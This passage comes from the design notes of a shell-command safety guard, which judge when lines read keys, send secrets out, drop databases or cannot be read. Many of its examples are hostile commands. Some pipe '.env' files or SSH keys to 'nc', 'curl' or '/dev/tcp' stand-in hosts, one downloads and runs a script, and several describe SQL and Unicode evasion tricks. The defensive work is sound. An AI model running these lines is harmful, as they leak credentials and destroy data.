  written out: up to 256 choices for one path, and 65,536 for a piece of code.

  A name is put back as its strings only as far as the reader holds them: a
  string worked out from names is cut at 4 KB, the strings of all names
  together at a few times the length limit, and the paths read out of names at
  1,024 for a piece of code (there is no count per name: 65 strings with the
  key last are all read). A name that went over one of them is dropped, and a
  read of it is `unknown`, never a read of nothing. So is a name grown in place
  (`k += '…'`).

  A name is put back as its strings only when the reader works out every
  binding of it whole. A binding is an assignment, an augmented assignment, a
  walrus, an unpacking target (`x, y = …`, `[x, *y] = …`, `({x} = …)`), a `for`,
  `with`, `except`, `match` or `catch` target, a parameter, a `def`, a `class`,
  a `global` or `nonlocal` write from a function, a `del`, a `var` declared
  again, an increment, a property of the global object, and a write from code
  that `exec` or `eval` runs, at any depth. One that is not a string the reader
  gives whole (`x = sys.argv[1]`, `x = chr(47) + '…'`, `x = '…'[::-1]`,
  `x = y[0]`, `x = g()`, `x = KEY if c else 'b'`, `x = '%s/…' % h`, any of the
  forms above) makes a read of the name `unknown` besides the strings it was
  set to whole, which are read as before: `read_secret` when one is a key, so
  `x = '/home/me/.ssh/id_rsa'` followed by `x = sys.argv[1]` is a read of the
  key, and `x = 'a.txt'` followed by it is `unknown`. A path worked out from
  such a name is `unknown` as well, whatever the order the code writes them in.
  A name that is only ever set in any other way (a parameter, an unpacking) is
  a path only known when the code runs.
- **A program that reads a secret without being given its path**: `gpg
  --export-secret-keys`, `security find-generic-password -w`, `printenv`.
- **What leaves the machine** is `SendSecret`'s, as above: `curl -d @key` and
  `scp key host:` upload a file, and are not read here.

### Accepted false alarms

A false alarm asks once more; a miss lets a key out. Each is a test row:

- A place is a secret by what it is under, not by which file: `cat
  ~/.ssh/id_ed25519.pub`, `cat ~/.ssh/known_hosts`, `cat ~/.ssh/config` and
  `cp ~/.ssh/id_ed25519.pub keys/` are `read_secret`, as they are for the file
  guard. (`cp ~/.ssh/id_ed25519.pub keys/` was a safe row before this rule.)
- A `<` redirect is a read whatever the program makes of it: `wc -l <
  ~/.ssh/known_hosts` is, as `wc -l ~/.ssh/known_hosts` is. `wc` counts, and is
  read like the rest because the redirect cannot tell it apart.
- `~/.ssh/$f` when `$f` climbs out of the folder, `grep -r x ~` when what it
  finds is not a key, `rg x ~` (which skips hidden entries), `git log --
  ~/.ssh/x` (git refuses a path outside the work tree), `tar cf ~/.ssh/x.tar
  src` (the archive is named under `.ssh`), and the pattern of a search that is
  spelled like a key's path.

### Why `effect` still says ReadsOnly

The rule is a finding about the file, not about what the line does to the
machine, so it joins `Elevated` in the findings that leave a line `ReadsOnly`
(see [Reads only](#reads-only)). The other choice, to make a read of a key not
reads-only, would turn `effect` into a second policy about keys, which the
caller already has from `classify`. A caller that runs a line unasked only when
`effect` is `ReadsOnly` must read `classify` too, and it already does to catch
`Elevated`.

## What cannot be read is risky

A line is never safe because the guard gave up on it. These come back risky:

- A program or script known only when it runs: `$CMD`, `eval "$x"`, `trap "$x" EXIT`, `iex $s`,
  `-EncodedCommand`.
- Code handed to an interpreter that is not read: Ruby, Perl (beyond
  `perl -pi`), PHP and Lua, and any code piped into an interpreter, or read
  from a file it is redirected from. Python and JavaScript given inline
  (`python3 -c`, `node -e`, `bun -e`, `deno eval`) are read, and what they do
  is judged (see [Inline code](#inline-code)); what cannot be followed in
  them is risky too.
- A .NET call that deletes, writes or starts a program.
- A database statement known only when it runs: `psql -c "$Q"`.
- A path built at run time or by a brace list.
- A line the grammar cannot parse.
- Shells nested past a limit, a parse tree nested too deep, or a line longer
  than the limit.

`unknown` is for a program or a script. `unreadable` is for a line the guard
could not read.

## Reading more than one unit at a time

Some risks only show when units are read together.

- **Links.** A link judges its target too. `ln ~/.zshrc z` is risky, since a
  later write to `z` lands on the startup file.
- **A script a line writes and then runs.** It is risky however it was
  written: a redirect, a download (`curl -o`, `curl -O`, `wget`), a copy or
  `tee`. `curl -fsSLo i.sh URL && sh i.sh` is `run_downloaded`. The guard
  matches the two by the file they name (core's `key`).
  When the line writes a file (a device such as `/dev/null` does not count),
  a script whose path cannot be placed (after a `cd` to somewhere unknown, or
  `bash C:x` after a `cd`) is `unknown`, since it may be the one the line wrote.
  A line that writes nothing has no such script.
- **A listing piped into a delete.** It hands on what it picks. `ls *.bak |
  xargs rm` and `Get-ChildItem *.log | Remove-Item` delete files in the
  workspace. A whole folder listed (`ls | xargs rm -rf`) is as much as the
  folder. A listed pattern is judged as the delete of that pattern is, `..`
  and all: `ls -d src/*/../../.g* | xargs rm -rf` is risky.
- **`find`.** It acts on the folder it searches when its name filter can match
  `.git`, or when it negates or alternates its filters (`!`, `-not`, `-o`).
- **Git config that makes git run a command.** `-c alias.x=!...`,
  `core.pager`, `core.sshCommand`, and `git config` setting them. Reading
  them is fine.
- **In-place edits.** `perl -pi -e` is an edit like `sed -i`, judged by the
  files it edits, when its code is only substitutions (`s/a/b/g`, `tr/.../.../`)
  that run nothing. An `/e` flag, `@{[...]}`, backticks or any other code make
  it risky.

## Secrets that leave the machine

`send_secret` is for a secret sent to another machine. Reading one here is not
this rule: `cat ~/.ssh/config` is [`read_secret`](#reading-a-key). Sending a
file that is not one is safe (`scp build/pkg.tar host:/srv/`,
`curl -d @payload.json https://api.example`).

**What is a secret.**

- A path core marks as holding a key or a credential: `~/.ssh`, `~/.aws`,
  `~/.gnupg`, the keychains and the rest of its table of secrets. Shell
  startup files and the repository's history are sensitive in core too, but
  they hold no secret, so sending one is not this rule. A public key
  (`id_ed25519.pub`) is not one either.
- An `.env` file anywhere, in the workspace too: `.env` and `.env.*`, not a
  folder, and not a template (`.env.example`, `.sample`, `.template`, `.dist`).
  A pattern that can name one (`.env*`, `.e*`, `.*`) counts when the shell
  expands it, as a word of its own: `-T .env*`, `scp .env* host:`. Part of a
  longer word is not expanded: the shell matches the whole word `@.env*`, which
  names no file, and `curl` reads that name as written, so `curl -d @.env*` is
  not a secret sent. This is the shell rule's own check: core's table does not
  hold it, since that would make `rm .env` a `delete` in the workspace.
- The whole environment: `env`, `printenv`, `set`, `export -p`, `declare -x`,
  `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`).
  One variable (`printenv HOME`, `Get-ChildItem env:PATH`) is not. cmd's bare
  `set` is not read by its grammar and comes back `unreadable`.

**What sends.**

- **An upload that names the file**: `curl -d @f` (also `--data`,
  `--data-binary`, `--json`, `--data-urlencode name@f`, `-F name=@f` and
  `name=<f`, `-T f`, `--upload-file`, `-H @f`, in a bundle such as `-sd @f`),
  `wget --post-file f` and `--body-file`, `http`, `https` and `xh` with
  `field@f`, `field=@f` or `@f`, and `Invoke-WebRequest` and
  `Invoke-RestMethod -InFile f`, `Send-MailMessage -Attachments f` (a list),
  and `Start-BitsTransfer -Source f` when `-TransferType` is `Upload`.
- **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
  a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`
  and `gsutil` to a `s3://` or `gs://` one. A source that is a secret goes.
  So does the home directory itself, and a folder that holds it, the root of
  the disk included, which hold them (`scp -r ~ host:`, `scp -r / host:`). A
  destination only known when it runs counts as remote for `scp` and `sftp`,
  and for the others when it holds a colon. The key a program logs in with
  (`ssh -i`, `scp -i`, `-o IdentityFile=`, `curl --key`) is not sent.
- **A pipeline.** A stage reads a secret (any program given one's path, the
  environment, or a file redirected onto it) and a later stage sends its input:
  `nc`, `ncat`, `socat`, `telnet`, `ssh`, `mail`, `Invoke-RestMethod`,
  `Send-MailMessage` (which attaches what it is piped), `curl`
  with `-d @-` or `-T -`, `wget --post-file=-`, `http` and `xh` (unless
  `--ignore-stdin`), `openssl s_client`, `rclone rcat`, `aws s3 cp -`. A stage between them changes nothing: `cat .env | base64 | nc h
  1` is sent. A program an `xargs` or `ForEach-Object` hands its input to
  counts as a stage that reads it. The pipeline after a here-document
  (`cat .env <<EOF | nc host 1`, `cat .env <<EOF | base64 | nc host 1`) is the
  same pipeline as the command before it, however many stages it has; so is a
  here-document after a pipeline (`echo hi | cat .env - <<EOF | nc host 1`),
  whose stages come first. In cmd, `type .env | more | ssh host` is one
  pipeline of three stages, as in the other shells. A pipeline inside a stage
  of another (`(cat .env | base64) | nc host 1`, `cat .env | { base64 | nc host
  1; }`, `cat .env | bash -c "base64 | nc host 1"`, `(type .env | more) | ssh
  host`, `(gc .env | Out-String) | irm …`) runs in that stage: a secret read in
  the inner pipeline counts for that stage of the outer one, and a sender in
  the inner pipeline is handed what the earlier stages of every pipeline around
  it read. A substitution, process substitution or script in a command runs
  with that command's input, so a sender that has one is handed what the
  stages before it read: `cat .env | curl -d "$(cat)" url`, `cat .env | bash -c
  'curl -d "$(cat)" url'`. It does not look at what the substitution runs: `cat
  .env | curl -H "X: $(date)" url` is flagged too, since it pipes a secret into
  a sender.
- **A redirect.** A secret redirected onto the input of one of those
  (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), or a command's output
  redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
  opens that path: `tee /dev/tcp/…` and `dd of=/dev/tcp/…` open a real path,
  find none and send nothing. PowerShell has no `<` redirect.
- **A substitution or a variable.** A sender handed a secret in its own
  arguments: `curl -d "$(cat .env)" url`, `$(<.env)`, a here-document or
  here-string that runs one, `` `…` ``, PowerShell's `-Body (Get-Content f)`;
  and a variable set from one (`k=$(cat .env); curl -d "$k" url`, `export
  K=$(…)`, and a variable set from that, copies included: `j=$k`, `j="$k"`,
  `export j=$k`). A held variable carried by a here-string or an unquoted
  here-document is a sender's input (`nc host 1 <<< "$k"`); a quoted
  delimiter (`<<'EOF'`) expands nothing.

A script a shell starts, a `find -exec` and a substitution take the place in a
pipeline of the command they run for.

Not read, so the caller has to account for them: a secret read into a PowerShell
variable (`$k = Get-Content …`) or by `read` and `mapfile`; a path known only
when it runs (`curl -d @$F`); a connection opened with `exec 3<>/dev/tcp/…`;
`git push` of a committed `.env`; secrets outside core's table (`/etc/shadow`,
a key with an unusual name); and a `find -exec` whose filter picks secrets by a
name the guard does not know (`-name '*.pem'`).

## Data in a database

`drop_data` is for a statement a database client is given that drops,
truncates or empties something. The guard sees files and disks, and a database
is neither: `psql -c 'DROP TABLE users'` touches no path the line names.
Reading, inserting, creating and a statement that picks its rows are safe.

**Where the statement is.** Only text on the line itself is read: an option, an
operand, a here-document or here-string fed to the client, or the text a
piped `echo`, `printf` or `Write-Output` (or a `cat` given a here-document)
says. A `cat` reads its input, and passes the text fed to it on, when it has
no file operand, or has `-` or `/dev/stdin` among its operands, whatever its
options (`cat - <<< 'DROP TABLE t' | psql`, `cat schema.sql - <<EOF | psql`,
`cat -s <<EOF | psql`); a `cat` of files only ignores its input. An operand
only known when it runs may be `-`. The grammar leaves a lone `-` that is the
last word before a here-document out of its tree, so the guard puts it back.
On PowerShell a value that is piped
on says its text as `Write-Output` would: a string or a here-string
(`'DROP TABLE t' | psql`, `@'` … `'@ | psql`) is read, and anything else (a
variable, `(Get-Content q.sql)`, `$x.y`, `"a" + "b"`) says what is only known
when it runs, so it is `unknown`. In a double-quoted string or a
double-quoted here-string a backtick makes the character PowerShell gives it
(`` `n `` and `` `r `` a line break, `` `t `` a tab, `` `0 ``, `` `a ``, `` `b ``,
`` `e ``, `` `f ``, `` `v `` and `` `u{…} `` the others), so `"SELECT 1;`nDROP
TABLE t"` is two statements and `iex @"` … `"@` runs the lines that a
backtick breaks. A `` `u{…} `` that makes a character PowerShell reads as more
than a character when the text runs as code (a space that is not an ASCII one,
such as U+00A0 or U+3000, which splits words; a dash from U+2013 to U+2015; a
typographic quote from U+2018 to U+201E) leaves a script read from the string
known only when it runs, so `iex "Remove-Item`u{a0}C:\Windows`u{a0}-Recurse"`
is `unknown`. So is a script that holds such a character wherever it is read
from: `cmd /c "pwsh -c Remove-Item`u{a0}C:\Windows`u{a0}-Recurse"` hands
PowerShell only part of the string, and the guard asks about the character, not
the whole string. As a path or any other argument the string is the text it holds:
`Get-Content "~\x`u{a0}\..\.ssh\id_rsa"` reads the key.
Several arguments to `Write-Output` or `echo` are one line
each, so `Write-Output 'SELECT 1 --' 'DROP TABLE t' | psql` runs the `DROP`;
`cmd`'s `echo` joins them with a space. A stage that is a group (`{ echo 'BEGIN;';
echo 'DELETE FROM t;'; } |
psql`) is read program by program, and as the one text they say in turn
(`echo -n DR; echo -n OP TABLE t`). `printf` is decoded as `printf` reads its
format: `\n \t \\ \xHH` and the other single-character escapes, `\NNN` as one
to three octal digits with the 0 in front counting as one (`\0121` is a newline
and a `1`), and `%s`, `%b`, `%d` and `%%` filled from the arguments, the format
used again while arguments are left; any other directive or escape (and `\c`,
which shells read differently in a format) makes the text `unknown`. `%b` and
`echo -e` take `\0NNN`, and `\c` ends their output. `echo` is read as written
and as decoded, since `sh`, `zsh` and `echo -e` turn `\n` into a newline.
Where shells differ in what they decode, the text is read as each of bash, zsh
and dash prints it, and a statement any of them shows counts: dash leaves
`\xHH` as written (and decodes `\n` next to it), bash's `echo -e` and zsh's
leave `\NNN` with no 0 in front, and zsh and dash leave `\"`, `\'` and `\?` in a
format. A file of statements (`psql -f
migrations/001.sql`, `sqlite3 data.db < seed.sql`, `cat seed.sql | psql`) is
the workspace's own code and is safe, as `python3 scripts/gen.py` is.

An unquoted here-document is read as the shell feeds it: the shell treats its
body as the inside of a double-quoted word, so a backslash before a newline
joins the lines (`DR\` then `OP TABLE t` is `DROP TABLE t`), a backslash
before `$`, a backtick or a backslash goes and leaves the character (`\\!`
is `\!`, `\$x` is `$x`), and `$$` is the shell's process id (so `SELECT $$ ;
DROP TABLE t; $$` runs the `DROP`). What is left of an unescaped `$` or
backtick is an expansion, as in a double-quoted word, so the body is a
template; a body with both an escaped and an expanding `$` or backtick is
`unknown`. `<<-` takes the tabs off each line first. A quoted delimiter
(`<<'EOF'`, `<<\EOF`) feeds the body as it is.

What a stage says is worked out once and read once for each client language,
whatever the number of clients after it, so the time grows with the line and
not with the clients times the programs. A stage that says more than 256 KB
is `unknown`, and a `printf` stops printing when the stage's share is used
up.

| Client | Statement |
| --- | --- |
| `psql` | `-c`, `--command` |
| `mysql`, `mariadb` | `-e`, `--execute`, `--init-command` |
| `sqlite3` | the operands after the file, `-cmd` |
| `duckdb` | the operands after the file, `-c`, `-s`, `-cmd` |
| `mongosh`, `mongo` | `--eval` |
| `redis-cli` | the command and its arguments |
| `clickhouse-client`, `clickhouse client` | `-q`, `--query` |
| `sqlcmd` | `-Q`, `-q` (`/Q` too on Windows) |
| `cqlsh` | `-e`, `--execute` |

Short options bundle (`psql -Atc`), a value may be attached (`-cSQL`,
`--command=SQL`), and a long option may be any unique start of one of the
client's long options, as `getopt_long` reads it: `psql --co` is `--command`,
while `--c` starts both `--command` and `--csv`, is ambiguous, and psql
refuses to run it, so it is no statement option. `mysql` reads `_` as `-`
(`--init_command`). A password option that takes its value only when it is
attached leaves the next word alone: in `mongosh` (which reads its options as
yargs does) a word that starts with `-` is never the value of any option, and
`clickhouse-client --password` takes none from one, so `mongosh -u admin -p
--eval 'db.dropDatabase()'` and `clickhouse-client --password --query 'DROP
TABLE t'` read the statement option after the password. A statement option
followed by such a word reads the word as the statement too.

**What destroys.**

- **SQL.** `DROP` (a table, database, schema, index, view, anything; also
  `ALTER TABLE … DROP`), `TRUNCATE`, `DELETE` and `UPDATE` with no `WHERE`. A
  `WHERE` that picks every row (`WHERE 1`, `WHERE true`, `WHERE 1 = 1`) is
  none. A `WHERE` belongs to its own statement: in a batch with no `;`, the
  `WHERE` of a later `SELECT`, `EXEC` or `PRINT` is not the `UPDATE`'s
  (`UPDATE t SET a = 1 SELECT 1 WHERE b = 2` updates every row).
  `DO UPDATE SET`, `FOR UPDATE`, `AFTER UPDATE`, `GRANT UPDATE` and `THEN
  DELETE` after a `WHEN [NOT] MATCHED` of a `MERGE` are parts of other
  statements, and `TRUNCATE(x)` is a function; a `THEN DELETE` anywhere else
  (`IF x THEN DELETE FROM t`, `EXCEPTION WHEN OTHERS THEN DELETE FROM t`) is
  a statement. `ON DELETE` and `ON UPDATE` are a rule, not a statement, only
  when the word after the verb is a referential action or rule word
  (`CASCADE`, `SET`, `RESTRICT`, `NO`, `TO`, `CURRENT_TIMESTAMP`, `NOW`,
  `LOCALTIME`, `LOCALTIMESTAMP`): `ON DELETE CASCADE`, `ON UPDATE SET NULL`,
  `CREATE RULE r AS ON DELETE TO t`. `SET NOCOUNT ON DELETE FROM t` is a
  statement: in a T-SQL batch with no `;` the `ON` ends a `SET`, and `DELETE
  FROM` or `UPDATE t SET` after it are the next statement. `ON COMMIT DELETE
  ROWS` empties a temporary table at the end of a transaction, and is none.
  A `DROP` that takes away no data is none: `DROP NOT NULL`, `DROP DEFAULT`,
  `DROP CONSTRAINT`, `ON COMMIT DROP`, ClickHouse's `SYSTEM DROP DNS CACHE`,
  and `DROP IDENTITY` and `DROP EXPRESSION` only after `ALTER [COLUMN]
  <name>` (the word `COLUMN` is optional and neither word is reserved, so
  `ALTER TABLE users DROP identity` drops a column called `identity`);
  `DROP COLUMN`, `DROP PARTITION` and a bare `DROP` are. `DELETE` and
  `UPDATE` inside a `WITH` or after
  `EXPLAIN ANALYZE` count. `DO $$ … $$` and `DO '…'` (any string) are read as
  the statements they hold, and PL/pgSQL's `EXECUTE` in the body (not
  `EXECUTE FUNCTION`) runs text only known when it runs, so it is `unknown`.
  Text given to something that runs it is read as SQL where it is a literal:
  `EXEC('…')` and `EXECUTE('…')`, `sp_executesql`, `sp_MSforeachtable` and
  `sp_MSforeachdb` (the literal text of every argument) in T-SQL, and
  `PREPARE s FROM '…'` in MySQL; text that is not a literal (`EXEC('DROP ' +
  @t)`, `sp_executesql @sql`, `PREPARE s FROM @q`) is `unknown`. A string
  inside a string is read up to eight levels deep, and deeper is `unknown`.
  In SQLite and DuckDB, `.restore` replaces the whole database with a file,
  so it destroys. Both shells take any start of a dot command's name for the
  command (`.sh`, `.sy` and `.syst` are `.shell` and `.system`, `.op` is
  `.open`, `.rea` is `.read`, `.res` is `.restore`), so a name counts as every
  command it starts: `.shell`, `.system`, `.open`, `.attach`, `.read`,
  `.output`, `.once`, `.import`, `.restore`, `.backup` and `.save`.
  `.backup ?DB? FILE` and `.save ?OPTIONS? FILE` replace the file they are
  given, whatever database they copy from and `-readonly` or not, so the last
  word is judged like any file: in the workspace, a temporary directory or
  memory it is safe, anywhere else it is `drop_data`. The names are the
  shortest start no other command has (`.bac`, `.sa`; `.ba` and `.b` are
  not them, and `.bail` is another command). `VACUUM INTO` and `.clone`
  refuse a file that exists and are safe.
- **Redis.** `FLUSHALL`, `FLUSHDB`, an `EVAL` whose script calls one or calls
  `DEL` or `UNLINK` and also `KEYS` or `SCAN` (the commands are the strings it
  calls, so `KEYS[1]`, the keys it is given, is not a listing), and a
  `DEL` or `UNLINK` of keys the line lists: `redis-cli --scan … | xargs
  redis-cli del`, `redis-cli del $(redis-cli keys 'x*')`. `redis-cli del k`
  deletes one key and is safe. `redis-cli --cluster call HOST:PORT COMMAND…`
  runs the command on every node, and is read as the command.
- **MongoDB.** `dropDatabase`, `dropCollection`, `drop` (as a call or a
  command key), `deleteMany` and `remove` with no filter or `{}`.
- **The tools.** `dropdb`, `dropuser`, `mysqladmin drop` and `mariadb-admin
  drop`, MariaDB's name for it. `mysqladmin` runs a
  command from any unique start of its name (`mysqladmin proc stat` works),
  so a command word of two letters or more that starts `drop`, in any case,
  is `drop`: `dro`, `dr`.

**How a statement is read.** A keyword reader over the text, with no SQL
grammar. It skips comments and string literals, splits on `;`, and reads each
client as its own dialect, with only the quoting that client has, so that what
one dialect hides is not hidden in another:

| Dialect | Quoting and comments |
| --- | --- |
| PostgreSQL (`psql`) | `$tag$ … $tag$` and `E'…'` strings, block comments that nest, backslash commands; no backtick |
| SQLite (`sqlite3`) | backtick and `[…]` identifiers, dot commands, a line that starts with `#` when no statement is pending is skipped; no `$tag$`, no `E'…'` |
| DuckDB | PostgreSQL's parser: `$tag$ … $tag$` and `E'…'` strings, dot commands, `#` lines as SQLite's; a block comment that holds `/*` is `unknown`, since it is not known whether it nests |
| SQL Server (`sqlcmd`) | `[…]` identifiers, block comments that nest |
| MySQL, MariaDB | `#` comments, backslash escapes, backticks, `/*! … */` comments that run, `--` needing a space, `\g` and `\G` ending a statement, `\!` |
| ClickHouse | `#` comments, block comments that nest, backslash escapes, backticks, `$tag$` strings, `\G` |
| CQL (`cqlsh`) | `//` comments, `$$` strings |

A construct a dialect is not known to have is not read as hiding anything, so
what it holds is read as code. Whether a backslash escapes in a string is a
server setting the line can change, so the text is read with the other rule
too, in the two dialects where the setting exists, and what any reading shows
counts: MySQL and MariaDB also with no backslash escapes
(`NO_BACKSLASH_ESCAPES`) and with them in `'…'` strings only (`ANSI_QUOTES`,
where `"a\"` is an identifier), PostgreSQL also with them in `'…'` strings
(`standard_conforming_strings` off). `mysql -e "SET
sql_mode='NO_BACKSLASH_ESCAPES'; SELECT 'a\\'; DROP TABLE t; -- '"` drops the
table, as does a `psql` text that sets `standard_conforming_strings = off`
and then has `'a\'' ; DROP TABLE t; --'`, where the string takes `\'`. The
`mysql` and `mariadb` clients send each statement as its `;` arrives, and
`psql` reading its input does the same, so in a reading where a string is never
closed the statements that end before it still run: they are judged, and only
the open tail, which no client sends as a statement, is left out. `SELECT
'it\'s'` is safe in MySQL, and `SELECT 'a\'; DROP TABLE t; SELECT '` is not. A
`--` that no space follows is no comment in MySQL, so `SELECT "a\"; DROP TABLE
t; --"` leaves only `--"` open, and the `DROP` runs.
The same text without the `SET`, `SELECT 'a\'; DROP TABLE t; -- '`, is
`drop_data` for the same reason: a server set that way runs the `DROP`.

In `psql` a backslash outside a string starts a
command that ends at the end of its line or at the next backslash outside a
quote, which starts the next command (or is `\\`, and the SQL goes on after
it): `SELECT 1 \g out.txt \\ DROP TABLE t` drops the table, and `\set x 1 \!
touch f` runs `touch`. A here-document whose first line starts with a
backslash is read from that line. `\gexec` and
`\gset` run or keep text the line does not show, so they are `unknown`; `\!`,
a backtick in an argument, `\copy … program`, and `\o`, `\g`, `\gx` or `\w`
followed by `|` run a program. A statement the reader has to guess at is
`unknown`, never safe: a string, a comment or a `$$` string that is never
closed.

A variable the client fills in is only known when it runs, and where it starts
a statement the statement is `unknown`: `psql`'s `:name`, `:'name'` and
`:"name"` (`psql -v q='DROP TABLE t' <<< ':q'`, a `\set q …` and then `:q`) and
`sqlcmd`'s `$(name)` (`sqlcmd -v s="DROP TABLE t" -Q '$(s)'`). A `:name` or
`$(name)` further in is read as a word (`WHERE a = :x`), as a shell expansion
is, and `::` is a cast.

A statement that is only known when it runs (`psql -c "$Q"`, `-c $(cat
q.sql)`, a here-document that is just `$Q`) is `unknown`, with the reason `runs
a database statement only known when it runs`. In a double-quoted
POSIX statement the expansions stand as words, so `psql -c "DELETE FROM users
WHERE id = $id"` is read and is safe, `psql -c "DROP TABLE $t"` is
`drop_data`, and `psql -c "$verb FROM users"` is `unknown`. A `$` that starts
an expansion ends the word before it, since the expansion may be empty:
`psql -c "DROP$x TABLE t"`, `"TRUNCATE$x t"` and `"DELETE$opts FROM t"` are
`drop_data`, and so is `mongosh --eval "db.dropDatabase$x()"`. A template
with an escaped `$` or backtick in it (`psql <<< "SELECT \$( ; DROP TABLE t;
) $x"`, `echo "SELECT 1 \`; DROP TABLE t; \` $x" | psql`) is `unknown`, as an
unquoted here-document with both is: the shell passes the escaped text to the
client as it is, and the reader would take `\$(`, `\${` and a pair of
backticks for one expansion that hides the text between them; this covers
`echo`, `printf` and `Write-Output` too. On PowerShell and
cmd that is not so: an expansion in a double-quoted word (`$id`, `$(…)`,
`%id%`) is not read as a word, so any statement with one is `unknown`
(`psql -c "DELETE FROM t WHERE id = $id"`), even one that would destroy
(`psql -c "DROP TABLE t; $x"` is `unknown`, not `drop_data`); a single-quoted
PowerShell word has none. A client command that runs a
program is `unknown` too: `\!` in `psql` and `mysql`, `COPY … PROGRAM`,
`.shell`, `.system` and `.read |cmd` in `sqlite3` and `duckdb`, `xp_cmdshell`,
and `system` in `mysql` (it is no command of another client: ClickHouse's
`SYSTEM FLUSH LOGS` is a statement).
A script a Redis client runs (`EVAL`, `EVALSHA`, `FCALL`) that is only known
when it runs is `unknown` too.

**A file in the workspace is the agent's own.** `sqlite3` and `duckdb` on a
database file are judged like any file: inside the workspace or a temporary
directory, in memory (`:memory:`, no file) or opened `-readonly`, a `DROP`
is safe; anywhere else, or a file only known when it runs, it is `drop_data`.
`ATTACH`, `.open` and `.attach` reach another file, so they make the file
given not the only one, and the statements are judged as a file outside the
workspace, `-readonly` or not. A name with a scheme is read from its path when
it is a `file:` URI (`file:/home/me/x.db`, `file:///home/me/x.db`,
`file://localhost/…`, `%HH` decoded; `mode=memory` is in memory) and is not
the agent's own otherwise (`md:`, `motherduck:`, `s3://`); a Windows drive
(`C:`) is a path. The options that take a value are the ones `sqlite3 -help`
lists, the two-value `-lookaside` and `-pagecache` included, so none moves the
file onto its value. Every server database is risky, because the line cannot
tell a scratch database from production.

Migrations run by the project's own tool (`sqlx migrate run`, `rails
db:migrate`) are safe: the guard reads no program that is not on its list.

Not read, so the caller has to account for them: a statement behind a program
the guard does not read as local (`ssh host "psql -c …"`, `docker exec db psql
-c …`); a statement handed over by a file, a process substitution
(`psql -f <(…)`) or a stage that is not `echo`, `printf`, `Write-Output` or
`cat` (`echo … | sed … | psql`); stored procedures (`CALL p()`, `EXEC p`),
whatever they run; the
text of a prepared statement that is not on the line (`EXECUTE s` after a
`PREPARE` in an earlier call; one in the same text is read); a `WHERE`
that is true for every row in a way other than `1`, `TRUE` and `1 = 1`;
a `psql` variable or `sqlcmd` `$(var)` that does not start a statement
(`WHERE a = :x`: it is read as a word, and may hold more than a value);
`sqlcmd`'s `!!` and `GO`; a stage between `echo` and the client (`echo … |
tee | psql`); other clients (`pgcli`, `mycli`, `litecli`, `pg_restore --clean`).

## Reads only

`classify` says whether a line is safe to run without asking. A caller that
asks on every line in a careful mode has a second question: does this line only
read? `ls`, `git status`, `cat src/main.rs` and `rg TODO` change nothing, and a
caller may run them without a question where it asks on `mkdir build`, which is
safe but changes the disk. Safe and reads-only are different answers, so
`effect` answers the second beside `classify`, and it is not a rule: it adds
nothing to `Rule`, and what a caller does with it is its policy.

```rust
effect(line, shell, &paths) -> Effect   // ReadsOnly(Reach), Changes or Unknown
```

| Answer | When |
| --- | --- |
| `ReadsOnly(Reach)` | Every unit is a known reader run with reading flags on files the guard can name, no redirect writes a file (the null device is not one), no `cd` the guard cannot follow, and the rules found nothing but an elevation or a read of a key. The [`Reach`](#reach) says where it reads. |
| `Changes` | Any unit is a known writer, a package manager or a build tool, any redirect writes a file, or a rule found the line risky for what it changes (`delete`, `wipe_disk`, `overwrite`, `git_discard`, `git_remote`, `git_history`, `permissions`, `system_settings`, `stop_system`, `send_secret`, `drop_data`). |
| `Unknown` | Anything is not understood: a program the table does not know, a program or script known only when it runs, a nested script, a line that cannot be read in full, a limit hit. Never `ReadsOnly`: what cannot be read is not reads-only. |

A line with a known writer is `Changes` whatever else it holds: `mkdir build &&
./script.sh` changes things, and not knowing the rest does not take that back.
`Unknown` is for a line with nothing known to change and something unread.

`effect` and `classify` come from one code path. A line is split once and
judged once, and both answers are read from that split and its findings, never
from the raw text, so they cannot disagree about what the units are. The
answers are independent, and a caller reads both. **Safe is not reads-only and
reads-only is not Safe**: `cat ~/.ssh/id_ed25519` reads only, beyond the
workspace (and is `read_secret`), and `mkdir build` is safe and changes the
disk. One direction does hold, and `tests/` checks it on every row of every
table and on random noise: a line `classify` finds risky for anything but an
elevation or a read of a key is never `ReadsOnly`. `sudo cat /etc/hosts` is
`ReadsOnly(Beyond)` and `Elevated`, and `cat ~/.ssh/id_ed25519` is
`ReadsOnly(Beyond)` and `ReadSecret`: both findings say what the line is, not
that it changes anything. `effect` puts `ReadSecret` beside `Elevated` because
the line still only reads, and the caller, who reads both answers, decides what
a read of a key means. The `Reach` is `Beyond` for a read of a secret even
inside the workspace.

**Wrappers** come off as `classify` takes them off, and what they run decides:
`sudo cat` reads only. Only the wrappers that just run the next program are
let through (`sudo`, `doas`, `gsudo`, `pkexec`, `env`, `nice`, `ionice`,
`time`, `timeout`, `stdbuf`, `xargs`, `command`, `builtin`, `noglob`,
`nocorrect`, `-`, `coproc`, and the `find` a `-exec` makes), and only with
options the guard knows: any other option makes the line `Unknown`, since it
could do anything (`sudo -e` edits a file, `sudo -s` and `-i` start a shell,
`env -P` changes where programs are found, `env -C` the folder they run in).
`time -o FILE` and `time --output=FILE` write a file, so they are `Changes`.
`flock` makes its lock file, `nohup` may make `nohup.out`, `tmux` and `screen`
start sessions: those wrap a reader into `Unknown`. A shell started with a
script (`bash -c`, `eval`, `cmd /c`, `powershell -Command`) is a program the
table does not know, so it is `Unknown` even when the script it holds only
reads.

### Reach

A caller that runs reads-only lines without asking, in its most careful mode,
needs one more answer: do the reads stay in the project? `ls src` and `cat
src/main.rs` do; `cat /etc/passwd`, `grep -r password ~` and `cat
~/.ssh/id_ed25519` do not. So `ReadsOnly` carries a `Reach`:

```rust
Effect::ReadsOnly(Reach)   // Reach::Workspace or Reach::Beyond
```

`Reach` is exhaustive on purpose, like `Effect`: a third answer would change
what a caller's careful mode means by "stays in the workspace".

`Reach` is about reading what is not the project's. Protected paths are about
writes, and do not count here.

- **`Workspace`**: every read lands inside a workspace folder (the
  repository's history, a startup file and a path the caller protects are
  inside it too), in a temporary file, or on the null device, and none is a
  secret.
- **`Beyond`**: at least one read lands anywhere else: the home folder, a
  system folder, a folder that holds the workspace (`..`), a temporary folder
  itself (`ls /tmp`; a file inside it is `Workspace`), a disk, the registry,
  anywhere outside the workspace; or it is a **secret**, core's
